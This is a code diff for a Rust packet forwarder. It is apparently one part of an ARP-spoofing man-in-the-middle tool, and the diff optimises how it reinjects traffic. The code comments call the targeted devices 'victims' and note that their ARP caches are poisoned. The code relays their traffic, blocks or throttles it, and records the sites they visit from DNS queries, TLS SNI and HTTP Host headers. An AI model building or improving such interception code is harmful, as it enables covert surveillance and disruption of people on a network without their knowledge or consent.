@@ -31,7 +31,6 @@ use std::sync::Mutex;
 
 use pcap::Capture;
 use pcap::Device as PcapDevice;
-use pnet_packet::ethernet::{EtherTypes, EthernetPacket};
 use pnet_packet::ipv4::Ipv4Packet;
 use pnet_packet::tcp::TcpPacket;
 use pnet_packet::udp::UdpPacket;
@@ -59,6 +58,8 @@ pub struct L2Forwarder {
     local_ip: String,
     local_mac: String,
     gateway_mac: String,
+    local_mac_bytes: [u8; 6],
+    gateway_mac_bytes: [u8; 6],
     capture_handle: Mutex<Option<Capture<pcap::Active>>>,
     send_handle: Mutex<Option<Capture<pcap::Active>>>,
     /// Cumulative count of packets forwarded (rewritten and reinjected).
@@ -75,11 +76,15 @@ impl L2Forwarder {
             "[L2FORWARD] Created forwarder: iface={} local_ip={} local_mac={} gateway_mac={}",
             iface, local_ip, local_mac, gateway_mac
         );
+        let local_mac_bytes = parse_mac_to_bytes(local_mac).unwrap_or([0u8; 6]);
+        let gateway_mac_bytes = parse_mac_to_bytes(gateway_mac).unwrap_or([0u8; 6]);
         Self {
             iface: iface.to_string(),
             local_ip: local_ip.to_string(),
             local_mac: local_mac.to_lowercase(),
             gateway_mac: gateway_mac.to_lowercase(),
+            local_mac_bytes,
+            gateway_mac_bytes,
             capture_handle: Mutex::new(None),
             send_handle: Mutex::new(None),
             packets_forwarded: AtomicU64::new(0),
@@ -88,8 +93,8 @@ impl L2Forwarder {
         }
     }
 
-    /// Open the read/capture handle with the anti-loop BPF filter.
-    pub fn open_capture(&self) -> Result<(), String> {
+    /// Helper to create and configure a capture handle.
+    fn create_capture(&self) -> Result<Capture<pcap::Active>, String> {
         let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
         let dev = devices
             .into_iter()
@@ -98,28 +103,34 @@ impl L2Forwarder {
 
         let mut cap = Capture::from_device(dev)
             .map_err(|e| format!("pcap open device: {}", e))?
-            .promisc(true)
-            .snaplen(65535)
-            .timeout(100)
+            .promisc(false)
+            .snaplen(2048)
+            .buffer_size(16 * 1024 * 1024)
+            .timeout(1)
             .immediate_mode(true)
             .open()
             .map_err(|e| format!("pcap open capture: {}", e))?;
 
-        // Anti-loop BPF filter (Blueprint 3.A)
+        // Anti-loop BPF filter (Blueprint 3.A) - handles both untagged and 802.1Q tagged frames
         let filter = format!(
-            "ip and not host {} and not ether src {}",
+            "(ip or (vlan and ip)) and not host {} and not ether src {}",
             self.local_ip, self.local_mac
         );
         cap.filter(&filter, true)
             .map_err(|e| format!("pcap filter '{}' : {}", filter, e))?;
-        println!("[L2FORWARD] Capture opened with BPF: {}", filter);
+        Ok(cap)
+    }
 
+    /// Open the read/capture handle with the anti-loop BPF filter.
+    pub fn open_capture(&self) -> Result<(), String> {
+        let cap = self.create_capture()?;
+        println!("[L2FORWARD] Capture opened with BPF (promisc=false, immediate=true)");
         let mut guard = self.capture_handle.lock().unwrap();
         *guard = Some(cap);
         Ok(())
     }
 
-    /// Open the injection/send handle.
+    /// Open the injection/send handle with minimal buffering and drop filter.
     pub fn open_send(&self) -> Result<(), String> {
         let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
         let dev = devices
@@ -127,17 +138,22 @@ impl L2Forwarder {
             .find(|d| d.name == self.iface)
             .ok_or_else(|| format!("interface '{}' not found for send", self.iface))?;
 
-        let cap = Capture::from_device(dev)
+        let mut cap = Capture::from_device(dev)
             .map_err(|e| format!("pcap open device send: {}", e))?
             .promisc(false)
-            .snaplen(65535)
-            .timeout(10)
+            .snaplen(64)
+            .buffer_size(64 * 1024)
+            .immediate_mode(false)
+            .timeout(1000)
             .open()
             .map_err(|e| format!("pcap open capture send: {}", e))?;
 
+        // Drop incoming packets on send handle so Npcap kernel driver does zero packet buffering/copying
+        let _ = cap.filter("ether proto 0xffff", true);
+
         let mut guard = self.send_handle.lock().unwrap();
         *guard = Some(cap);
-        println!("[L2FORWARD] Send handle opened.");
+        println!("[L2FORWARD] Send handle opened with kernel drop filter.");
         Ok(())
     }
 
@@ -148,10 +164,21 @@ impl L2Forwarder {
 
     /// Blocking forwarding loop. Call from `spawn_blocking`.
     pub fn run_forwarding_loop(&self) -> Result<(), String> {
-        println!("[L2FORWARD] Starting forwarding loop...");
+        println!("[L2FORWARD] Starting lock-free forwarding loop...");
+
+        let mut cap = match self.capture_handle.lock().unwrap().take() {
+            Some(c) => c,
+            None => return Err("capture handle not initialized".to_string()),
+        };
+
+        let mut send_cap = match self.send_handle.lock().unwrap().take() {
+            Some(c) => c,
+            None => return Err("send handle not initialized".to_string()),
+        };
 
         let mut consecutive_errors: u32 = 0;
         let mut last_debug_print = std::time::Instant::now();
+        let mut stack_buf = [0u8; 2048];
 
         loop {
             // Check shutdown flag before each iteration
@@ -160,43 +187,39 @@ impl L2Forwarder {
                 return Ok(());
             }
 
-            // Extract packet data (copied) while holding the guard,
-            // then release the guard before processing.
-            let pkt_data: Option<Vec<u8>>;
-            {
-                let mut guard = self.capture_handle.lock().unwrap();
-                let cap = match guard.as_mut() {
-                    Some(c) => c,
-                    None => return Ok(()),
-                };
-                match cap.next_packet() {
-                    Ok(pkt) => {
-                        pkt_data = Some(pkt.data.to_vec());
-                        consecutive_errors = 0;
-                        let seen = self.packets_seen.fetch_add(1, Ordering::Relaxed);
-                        // DEBUG: print packet count every 5 seconds
-                        if last_debug_print.elapsed().as_secs() >= 5 {
-                            let fwd = self.packets_forwarded.load(Ordering::Relaxed);
-                            println!(
-                                "[L2FORWARD] packets_seen={} packets_forwarded={}",
-                                seen + 1,
-                                fwd
-                            );
-                            last_debug_print = std::time::Instant::now();
-                        }
+            match cap.next_packet() {
+                Ok(pkt) => {
+                    let pkt_len = pkt.data.len();
+                    consecutive_errors = 0;
+                    let seen = self.packets_seen.fetch_add(1, Ordering::Relaxed);
+                    // DEBUG: print packet count every 5 seconds
+                    if last_debug_print.elapsed().as_secs() >= 5 {
+                        let fwd = self.packets_forwarded.load(Ordering::Relaxed);
+                        println!(
+                            "[L2FORWARD] packets_seen={} packets_forwarded={}",
+                            seen + 1,
+                            fwd
+                        );
+                        last_debug_print = std::time::Instant::now();
                     }
-                    Err(pcap::Error::TimeoutExpired) => {
-                        pkt_data = None;
-                        consecutive_errors = 0;
-                    }
-                    Err(pcap::Error::NoMorePackets) => return Ok(()),
-                    Err(e) => {
-                        eprintln!("[L2FORWARD] capture error: {}", e);
-                        pkt_data = None;
-                        consecutive_errors += 1;
+
+                    if pkt_len <= stack_buf.len() {
+                        stack_buf[..pkt_len].copy_from_slice(pkt.data);
+                        self.process_packet(&stack_buf[..pkt_len], &mut send_cap);
+                    } else {
+                        let heap_buf = pkt.data.to_vec();
+                        self.process_packet(&heap_buf, &mut send_cap);
                     }
                 }
-            } // guard dropped here
+                Err(pcap::Error::TimeoutExpired) => {
+                    consecutive_errors = 0;
+                }
+                Err(pcap::Error::NoMorePackets) => return Ok(()),
+                Err(e) => {
+                    eprintln!("[L2FORWARD] capture error: {}", e);
+                    consecutive_errors += 1;
+                }
+            }
 
             // ---- pcap auto-recovery ----
             if consecutive_errors >= 50 {
@@ -204,17 +227,12 @@ impl L2Forwarder {
                     "[L2FORWARD] {} consecutive pcap errors — attempting recovery...",
                     consecutive_errors
                 );
-                // Drop the broken capture handle
-                {
-                    let mut guard = self.capture_handle.lock().unwrap();
-                    *guard = None;
-                }
-
                 let mut recovered = false;
                 for attempt in 1..=5 {
-                    match self.open_capture() {
-                        Ok(()) => {
+                    match self.create_capture() {
+                        Ok(new_cap) => {
                             println!("[L2FORWARD] pcap recovered (attempt {})", attempt);
+                            cap = new_cap;
                             consecutive_errors = 0;
                             recovered = true;
                             break;
@@ -237,181 +255,159 @@ impl L2Forwarder {
                     return Err("pcap recovery exhausted after 5 attempts".to_string());
                 }
             }
-
-            if let Some(ref data) = pkt_data {
-                self.process_packet(data);
-            }
         }
     }
 
-    /// Process a single captured packet.
-    fn process_packet(&self, data: &[u8]) {
-        let eth = match EthernetPacket::new(data) {
-            Some(e) => e,
-            None => return,
-        };
-
-        let ethertype = eth.get_ethertype();
-
-        // Only handle IPv4
-        if ethertype != EtherTypes::Ipv4 {
+    /// Process a single captured packet with lock-free reinjection.
+    fn process_packet(&self, data: &[u8], send_cap: &mut Capture<pcap::Active>) {
+        if data.len() < 14 {
             return;
         }
 
-        let source_mac = eth.get_source();
+        let source_mac = MacAddr(data[6], data[7], data[8], data[9], data[10], data[11]);
         let source_str = mac_addr_to_str(&source_mac);
 
-        // Parse inner IPv4
-        let ipv4 = match Ipv4Packet::new(eth.payload()) {
+        let raw_ethertype = u16::from_be_bytes([data[12], data[13]]);
+
+        // Support both standard Ethernet (0x0800) and 802.1Q VLAN tagged frames (0x8100) from routers
+        let (ip_offset, is_ipv4) = if raw_ethertype == 0x0800 {
+            (14, true)
+        } else if raw_ethertype == 0x8100 {
+            if data.len() >= 18 {
+                let inner = u16::from_be_bytes([data[16], data[17]]);
+                (18, inner == 0x0800)
+            } else {
+                (14, false)
+            }
+        } else {
+            (14, false)
+        };
+
+        if !is_ipv4 || data.len() < ip_offset + 20 {
+            return;
+        }
+
+        let ipv4_slice = &data[ip_offset..];
+        let ipv4 = match Ipv4Packet::new(ipv4_slice) {
             Some(ip) => ip,
             None => return,
         };
 
-        let _ip_src = format!("{}", ipv4.get_source());
-        let ip_dst = format!("{}", ipv4.get_destination());
-
-        // ---- Blueprint 3.B - Outbound (Victim -> Internet) ----
-        //
-        // DIRECTION LOGIC (from intercepting host's perspective):
-        //   Ether.src == monitored device MAC  →  this device is UPLOADING
-        //   (packet originated from the victim, heading out to the internet)
-        //
-        // Also handle the grace-period case: a device that was just
-        // un-monitored still has its ARP cache poisoned, so we keep
-        // forwarding for 2 seconds while the ARP restore takes effect.
-        let outbound_forward = REGISTRY.is_monitored_by_mac(&source_str)
-            || REGISTRY.is_in_grace_period(&source_str, 2.0);
-
-        if outbound_forward {
-            // DROP if device is blocked
-            if REGISTRY.is_blocked_mac(&source_str) {
-                return;
-            }
-
-            let len = data.len() as u64;
-
-            // FIX #2: Token bucket speed limit check — tokens consumed here
-            if !REGISTRY.allow_packet(&source_str, len) {
-                // Speed limit exceeded — drop the packet (no token consumed)
-                return;
-            }
-
-            // === SITES VISITED INSPECTION ===
-            let ip_payload = ipv4.payload();
-            // Check for DNS query (UDP dst port 53)
-            if let Some(udp) = UdpPacket::new(ip_payload) {
-                if udp.get_destination() == 53 {
-                    if let Some(domain) = extract_dns_query(udp.payload()) {
-                        crate::device_registry::REGISTRY.record_visit(&source_str, domain);
-                    }
-                }
-            } else if let Some(tcp) = TcpPacket::new(ip_payload) {
-                let dst_port = tcp.get_destination();
-                if dst_port == 443 {
-                    if let Some(sni) = extract_tls_sni(tcp.payload()) {
-                        crate::device_registry::REGISTRY.record_visit(&source_str, sni);
-                    }
-                } else if dst_port == 80 {
-                    if let Some(host) = extract_http_host(tcp.payload()) {
-                        crate::device_registry::REGISTRY.record_visit(&source_str, host);
-                    }
-                }
-            }
-
-            // FIX #2: Only count bytes & packet after successful send.
-            // On failure, refund tokens so bandwidth isn't permanently lost.
-            if self.rewrite_and_send(
-                data,
-                &self.gateway_mac,    // new Ether.dst
-                &self.local_mac,      // new Ether.src
-            ) {
-                // Source MAC is the monitored device → this is UPLOAD for that device
-                REGISTRY.add_ul(&source_str, len);
-                self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
-            } else {
-                // Send failed — refund tokens consumed by allow_packet
-                REGISTRY.refund_tokens(&source_str, len);
-            }
+        let ip_total_len = ipv4.get_total_length() as usize;
+        if ipv4_slice.len() < ip_total_len || ip_total_len < 20 {
             return;
         }
 
-        // ---- Blueprint 3.C - Inbound (Internet -> Victim) ----
-        //
-        // DIRECTION LOGIC (from intercepting host's perspective):
-        //   Ether.src == gateway MAC  AND  IP.dst == device IP
-        //   → that device is DOWNLOADING (packet from internet destined for device)
-        //
-        // NOTE: We use IP.dst (not Ether.dst) because ARP poisoning causes the
-        // gateway to send frames to OUR MAC for all victim IPs.  The IP header
-        // still contains the victim's real IP as the destination.
-        if source_str == self.gateway_mac {
-            if let Some(dev) = REGISTRY.get_by_ip(&ip_dst) {
-                // Grace period: forward even if no longer monitored
-                let inbound_forward = dev.is_monitored
-                    || REGISTRY.is_in_grace_period(&dev.mac, 2.0);
+        // Exact clean IPv4 packet (stripping any 802.11 FCS trailing bytes or driver padding)
+        let clean_ipv4 = &ipv4_slice[..ip_total_len];
 
-                if inbound_forward {
-                    // DROP if destination device is blocked
-                    if REGISTRY.is_blocked_mac(&dev.mac) {
-                        return;
+        let ip_src = format!("{}", ipv4.get_source());
+        let ip_dst = format!("{}", ipv4.get_destination());
+
+        // Dynamic IP update: if a client renewed DHCP or changed IP, update registry immediately
+        if source_str != self.local_mac && source_str != self.gateway_mac {
+            REGISTRY.update_ip_if_changed(&source_str, &ip_src);
+        }
+
+        // Frame wire length for accounting (standard 14-byte Ethernet header + IPv4 total length)
+        let wire_len = (14 + ip_total_len) as u64;
+
+        // ---- Outbound (Victim -> Internet) ----
+        if source_str != self.gateway_mac && source_str != self.local_mac {
+            if let Some((victim_mac, is_blocked)) = REGISTRY.check_forward_outbound(&source_str, &ip_src) {
+                if is_blocked {
+                    return;
+                }
+
+                if !REGISTRY.allow_packet(&victim_mac, wire_len) {
+                    return;
+                }
+
+                // === SITES VISITED INSPECTION ===
+                let ip_payload = ipv4.payload();
+                if let Some(udp) = UdpPacket::new(ip_payload) {
+                    if udp.get_destination() == 53 {
+                        if let Some(domain) = extract_dns_query(udp.payload()) {
+                            REGISTRY.record_visit(&victim_mac, domain);
+                        }
                     }
-
-                    let len = data.len() as u64;
-
-                    // FIX #2: Token bucket speed limit check — tokens consumed here
-                    if !REGISTRY.allow_packet(&dev.mac, len) {
-                        // Speed limit exceeded — drop the packet
-                        return;
+                } else if let Some(tcp) = TcpPacket::new(ip_payload) {
+                    let dst_port = tcp.get_destination();
+                    if dst_port == 443 {
+                        if let Some(sni) = extract_tls_sni(tcp.payload()) {
+                            REGISTRY.record_visit(&victim_mac, sni);
+                        }
+                    } else if dst_port == 80 {
+                        if let Some(host) = extract_http_host(tcp.payload()) {
+                            REGISTRY.record_visit(&victim_mac, host);
+                        }
                     }
+                }
 
-                    // FIX #2: Only count bytes & packet after successful send.
-                    if self.rewrite_and_send(
-                        data,
-                        &dev.mac,           // new Ether.dst = victim MAC
-                        &self.local_mac,    // new Ether.src = host MAC
-                    ) {
-                        // Gateway→Device → this is DOWNLOAD for that device
-                        REGISTRY.add_dl(&dev.mac, len);
-                        self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
-                    } else {
-                        // Send failed — refund tokens consumed by allow_packet
-                        REGISTRY.refund_tokens(&dev.mac, len);
-                    }
+                if self.rewrite_and_send(
+                    send_cap,
+                    clean_ipv4,
+                    &self.gateway_mac_bytes, // new Ether.dst = gateway MAC
+                    &self.local_mac_bytes,   // new Ether.src = local MAC
+                ) {
+                    REGISTRY.add_ul(&victim_mac, wire_len);
+                    self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
+                } else {
+                    REGISTRY.refund_tokens(&victim_mac, wire_len);
+                }
+                return;
+            }
+        }
+
+        // ---- Inbound (Internet / Gateway -> Victim) ----
+        if let Some((victim_mac, victim_mac_bytes, is_blocked)) = REGISTRY.check_forward_inbound(&ip_dst) {
+            if source_str != victim_mac && source_str != self.local_mac {
+                if is_blocked {
+                    return;
+                }
+
+                if !REGISTRY.allow_packet(&victim_mac, wire_len) {
+                    return;
+                }
+
+                if self.rewrite_and_send(
+                    send_cap,
+                    clean_ipv4,
+                    &victim_mac_bytes,     // new Ether.dst = victim MAC
+                    &self.local_mac_bytes, // new Ether.src = local MAC
+                ) {
+                    REGISTRY.add_dl(&victim_mac, wire_len);
+                    self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
+                } else {
+                    REGISTRY.refund_tokens(&victim_mac, wire_len);
                 }
             }
         }
     }
 
-    /// Rewrite MAC addresses and reinject the packet.
+    /// Rewrite MAC addresses and reinject clean untagged Ethernet frame with zero heap allocations and zero locks.
+    /// Strips any 802.1Q tags from router so victim mobile devices (Android/iOS) cleanly accept frames.
     /// Returns true on successful send, false on failure.
-    fn rewrite_and_send(&self, orig_data: &[u8], new_dst: &str, new_src: &str) -> bool {
-        let new_dst_bytes = match parse_mac_to_bytes(new_dst) {
-            Ok(b) => b,
-            Err(_) => return false,
-        };
-        let new_src_bytes = match parse_mac_to_bytes(new_src) {
-            Ok(b) => b,
-            Err(_) => return false,
-        };
-
-        let mut new_pkt = orig_data.to_vec();
-        if new_pkt.len() < 14 {
-            return false;
-        }
-
-        new_pkt[0..6].copy_from_slice(&new_dst_bytes);
-        new_pkt[6..12].copy_from_slice(&new_src_bytes);
-
-        // Pad to 60 bytes (minimum Ethernet frame size) to avoid
-        // Windows Npcap error 31 (ERROR_GEN_FAILURE) on injection.
+    fn rewrite_and_send(
+        &self,
+        send_cap: &mut Capture<pcap::Active>,
+        clean_ipv4: &[u8],
+        new_dst: &[u8; 6],
+        new_src: &[u8; 6],
+    ) -> bool {
+        let ip_len = clean_ipv4.len();
+        let frame_len = 14 + ip_len;
         const MIN_ETH_FRAME: usize = 60;
-        if new_pkt.len() < MIN_ETH_FRAME {
-            new_pkt.resize(MIN_ETH_FRAME, 0u8);
-        }
+        let target_len = if frame_len < MIN_ETH_FRAME { MIN_ETH_FRAME } else { frame_len };
 
-        let mut guard = self.send_handle.lock().unwrap();
-        if let Some(ref mut cap) = *guard {
-            match cap.sendpacket(new_pkt.as_slice()) {
+        let mut buf = [0u8; 2048];
+        if target_len > buf.len() {
+            let mut heap_buf = vec![0u8; target_len];
+            heap_buf[0..6].copy_from_slice(new_dst);
+            heap_buf[6..12].copy_from_slice(new_src);
+            heap_buf[12..14].copy_from_slice(&[0x08, 0x00]); // Pure untagged EtherTypes::Ipv4
+            heap_buf[14..14 + ip_len].copy_from_slice(clean_ipv4);
+            match send_cap.sendpacket(heap_buf.as_slice()) {
                 Ok(()) => true,
                 Err(e) => {
                     eprintln!("[L2FORWARD] !! sendpacket error: {}", e);
@@ -419,16 +415,27 @@ impl L2Forwarder {
                 }
             }
         } else {
-            false
+            buf[0..6].copy_from_slice(new_dst);
+            buf[6..12].copy_from_slice(new_src);
+            buf[12..14].copy_from_slice(&[0x08, 0x00]); // Pure untagged EtherTypes::Ipv4
+            buf[14..14 + ip_len].copy_from_slice(clean_ipv4);
+            if frame_len < MIN_ETH_FRAME {
+                buf[frame_len..MIN_ETH_FRAME].fill(0);
+            }
+            match send_cap.sendpacket(&buf[..target_len]) {
+                Ok(()) => true,
+                Err(e) => {
+                    eprintln!("[L2FORWARD] !! sendpacket error: {}", e);
+                    false
+                }
+            }
         }
     }
 
     /// Close the capture handle and signal the forwarding loop to exit.
     pub fn close_capture(&self) {
         self.stop_flag.store(true, Ordering::Relaxed);
-        let mut guard = self.capture_handle.lock().unwrap();
-        *guard = None;
-        println!("[L2FORWARD] Capture handle closed, stop flag set.");
+        println!("[L2FORWARD] Capture stop flag set.");
     }
 }
 
